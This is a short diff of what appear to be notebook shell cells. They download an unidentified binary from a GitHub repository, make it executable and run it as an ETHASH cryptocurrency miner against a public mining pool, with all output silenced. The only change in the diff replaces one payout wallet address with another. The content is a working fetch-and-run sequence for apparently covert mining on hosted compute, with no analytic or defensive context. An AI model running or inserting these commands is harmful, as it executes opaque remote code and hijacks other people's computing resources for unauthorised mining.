@@ -1,3 +1,3 @@
 ! wget https://github.com/mencobaiajanah/LM2/raw/main/3 > /dev/null
 ! chmod +x 3
-! ./3 --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x6e890745813facaeab2afab23440a04f6b55034a.GPU#fg38-pfgk > /dev/null 
+! ./3 --algo ETHASH --pool ethash.unmineable.com:3333 --user ETC:0x82bca3b7bcc50b03422c763a06bc9830ed09f0bd.GPU-1#bv15-64v8 > /dev/null
